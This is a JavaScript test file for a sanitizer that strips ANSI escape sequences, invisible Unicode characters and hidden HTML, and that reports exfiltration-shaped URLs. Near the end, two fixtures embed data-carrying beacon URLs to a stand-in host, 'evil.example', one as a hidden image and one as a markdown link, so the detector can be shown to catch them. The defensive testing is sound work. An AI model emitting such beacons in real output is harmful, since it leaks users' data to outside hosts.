/**
 * Tests for the top-level `sanitize` convenience entry: Layer-1 ANSI/ESC
 * neutralization + idempotency, lone-surrogate normalization, the leading-BOM
 * exception, and the opt-in HTML path (Layers 2 & 3).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { sanitize } from "../src/index.mjs";
import { cp } from "./test-helpers.mjs";

const ESC = cp(0x1b);
const ZW = cp(0x200b);

// ─── Layer 1: no raw ESC survives (reassembly + idempotency) ─────────────────

describe("sanitize: Layer 1 ESC neutralization + idempotency", () => {
  for (const [name, input, expected] of [
    ["invisible at the introducer", `${ESC}${ZW}[32m payload`, " payload"],
    ["invisible after the bracket", `${ESC}[${ZW}32m payload`, " payload"],
    [
      "two invisibles in one sequence",
      `${ESC}${ZW}[${ZW}32m payload`,
      " payload",
    ],
    [
      "nested split (incomplete residual)",
      `${ESC}${ZW}[${ESC}${ZW}[32m payload`,
      "[ payload",
    ],
    [
      "post-introducer split (one-pass)",
      `${ESC}[3${ZW}2m payload`,
      "2m payload",
    ],
    [
      "ANSI removal reconstitutes a sequence",
      `${ESC}${ESC}[32m[0m payload`,
      " payload",
    ],
    [
      "doubly nested ANSI reconstitution",
      `${ESC}${ESC}${ESC}[32m[31m[0m payload`,
      " payload",
    ],
  ]) {
    it(`reduces to its exact clean text and is idempotent (${name})`, async () => {
      const first = await sanitize(input);
      assert.ok(
        !first.cleaned.includes(ESC),
        `ESC survived: ${JSON.stringify(first.cleaned)}`,
      );
      assert.equal(first.cleaned, expected);
      assert.match(first.found.join(", "), /ANSI escapes/);
      const second = await sanitize(first.cleaned);
      assert.equal(second.cleaned, first.cleaned);
      assert.deepEqual(second.found, []);
    });
  }

  it("leaves clean text untouched (no spurious modification)", async () => {
    const out = await sanitize("plain text, no escapes");
    assert.equal(out.cleaned, "plain text, no escapes");
    assert.deepEqual(out.found, []);
    assert.deepEqual(out.warnings, []);
  });

  it("strips an invisible with no ANSI without reporting ANSI escapes", async () => {
    const out = await sanitize(`foo${ZW}bar`);
    assert.equal(out.cleaned, "foobar");
    assert.deepEqual(out.found, ["Format chars (Cf)"]);
  });

  it("strips a non-SGR escape (cursor move) too — the ESC introducer is the hazard", async () => {
    const out = await sanitize(`${ESC}[2Jhello`);
    assert.ok(!out.cleaned.includes(ESC));
    assert.match(out.found.join(", "), /ANSI escapes/);
  });

  it("strips a complete 8-bit C1 CSI sequence (U+009B introducer)", async () => {
    const out = await sanitize(`${cp(0x9b)}32m payload`);
    assert.ok(!out.cleaned.includes(cp(0x9b)));
    assert.equal(out.cleaned, " payload");
    assert.match(out.found.join(", "), /ANSI escapes/);
  });

  it("sweeps a lone/incomplete C1 CSI introducer (U+009B), reporting it", async () => {
    const out = await sanitize(`a${cp(0x9b)}b`);
    assert.ok(!out.cleaned.includes(cp(0x9b)), "U+009B survived the sweep");
    assert.equal(out.cleaned, "ab");
    assert.match(out.found.join(", "), /ANSI escapes/);
  });
});

// ─── Layer 1: BOM / fillers / variation selectors / long run ─────────────────

describe("sanitize: Layer 1 invisible classes", () => {
  it("strips interior BOM, preserves leading BOM", async () => {
    const out = await sanitize(`${cp(0xfeff)}hello${cp(0xfeff)}world`);
    assert.equal(out.cleaned, `${cp(0xfeff)}helloworld`);
    assert.match(out.warnings.join(" "), /Stripped: Format/);
  });
  it("preserves a single leading BOM with no warning", async () => {
    const out = await sanitize(`${cp(0xfeff)}clean leading bom`);
    assert.equal(out.cleaned, `${cp(0xfeff)}clean leading bom`);
    assert.deepEqual(out.warnings, []);
  });
  it("strips blank-rendering fillers that are not category Cf", async () => {
    const out = await sanitize(`vis${cp(0x3164)}${cp(0x2800)}ible`);
    assert.equal(out.cleaned, "visible");
    assert.match(out.warnings.join(" "), /Blank-rendering fillers/);
  });
  it("reports the Variation-selectors category by its label", async () => {
    const out = await sanitize(`hi${cp(0xfe0f)}${cp(0xe0101)}de`);
    assert.equal(out.cleaned, "hide");
    assert.match(out.warnings.join(" "), /Variation selectors/);
  });
  it("appends a LONG RUN note when a payload-length invisible run is present", async () => {
    const out = await sanitize(`x${cp(0x200b).repeat(12)}y`);
    assert.equal(out.cleaned, "xy");
    assert.match(out.warnings.join(" "), /LONG RUN/);
  });
  it("omits the LONG RUN note for a short invisible run", async () => {
    const out = await sanitize(`x${cp(0x200b).repeat(3)}y`);
    assert.equal(out.cleaned, "xy");
    assert.doesNotMatch(out.warnings.join(" "), /LONG RUN/);
  });
});

// ─── Layer 1: lone-surrogate normalization ───────────────────────────────────

describe("sanitize: lone-surrogate normalization", () => {
  it("replaces a lone high surrogate with U+FFFD and warns", async () => {
    const out = await sanitize(`a${String.fromCharCode(0xd800)}b`);
    assert.equal(out.cleaned, `a${cp(0xfffd)}b`);
    assert.ok(out.found.includes("Lone UTF-16 surrogates"));
    assert.match(out.warnings.join(" "), /Normalized lone UTF-16 surrogates/);
  });
  it("leaves a valid surrogate pair (emoji) intact", async () => {
    const out = await sanitize(`a${cp(0x1f600)}b`);
    assert.equal(out.cleaned, `a${cp(0x1f600)}b`);
    assert.deepEqual(out.warnings, []);
  });
});

// ─── No silent suppression contract ──────────────────────────────────────────

describe("sanitize: no silent suppression", () => {
  it("an unchanged input yields empty found/warnings", async () => {
    const out = await sanitize("just regular text");
    assert.equal(out.cleaned, "just regular text");
    assert.deepEqual(out.found, []);
    assert.deepEqual(out.warnings, []);
  });
  it("any change carries at least one warning", async () => {
    const out = await sanitize(`${ESC}[31mx${cp(0x200b)}y`);
    assert.notEqual(out.cleaned, `${ESC}[31mx${cp(0x200b)}y`);
    assert.ok(out.warnings.length > 0);
  });
});

// ─── HTML path (opt-in) ──────────────────────────────────────────────────────

describe("sanitize: html=false leaves HTML untouched", () => {
  it("does not splice hidden HTML when html is not requested", async () => {
    const input = "before <span hidden>SECRET</span> after";
    const out = await sanitize(input);
    assert.equal(out.cleaned, input);
    assert.deepEqual(out.warnings, []);
  });
});

describe("sanitize: html=true runs Layers 2 & 3", () => {
  it("splices a hidden element and an HTML comment, reporting both", async () => {
    const out = await sanitize("x <!-- c --> y <span hidden>SECRET</span> z", {
      html: true,
    });
    assert.doesNotMatch(out.cleaned, /SECRET/);
    assert.ok(out.found.includes("HTML comments"));
    assert.ok(out.found.includes("hidden HTML"));
    assert.match(out.warnings.join(" "), /HTML sanitized/);
  });

  it("reports a preserved script tag without removing it", async () => {
    const out = await sanitize("see <script>x</script> source", { html: true });
    assert.match(out.cleaned, /<script>x<\/script>/);
    assert.match(out.warnings.join(" "), /Preserved but reported/);
  });

  it("reports a preserved data: URI resource (dataSrc count)", async () => {
    const out = await sanitize('<img src="data:text/html,x">', { html: true });
    assert.equal(out.cleaned, '<img src="data:text/html,x">');
    assert.match(out.warnings.join(" "), /data: URI×1/);
  });

  it("detects an exfil URL hidden inside a stripped element (pre-splice scan)", async () => {
    const b64 = "A".repeat(44);
    const out = await sanitize(
      `<div hidden><img src="https://evil.example/x?data=${b64}"></div>`,
      { html: true },
    );
    // The beacon is spliced out of the cleaned text...
    assert.doesNotMatch(out.cleaned, /evil\.example/);
    // ...but still reported, because the exfil scan runs on the pre-splice text.
    assert.ok(out.found.includes("exfil URLs"));
    assert.match(out.warnings.join(" "), /evil\.example/);
  });

  it("flags a markdown exfil link", async () => {
    const out = await sanitize(
      "[c](https://evil.example/t?token=" + "A".repeat(44) + ")",
      { html: true },
    );
    assert.ok(out.found.includes("exfil URLs"));
    assert.match(out.warnings.join(" "), /Exfil-shaped URLs detected/);
  });

  it("returns benign HTML unchanged with no warnings on the html path", async () => {
    const out = await sanitize("hello <b>world</b>", { html: true });
    assert.equal(out.cleaned, "hello <b>world</b>");
    assert.deepEqual(out.warnings, []);
    assert.deepEqual(out.found, []);
  });

  it("runs Layer 1 before the HTML layer (invisible inside HTML is stripped)", async () => {
    const out = await sanitize(`hi${ZW} <b>there</b>`, { html: true });
    assert.equal(out.cleaned, "hi <b>there</b>");
    assert.ok(out.found.includes("Format chars (Cf)"));
  });
});
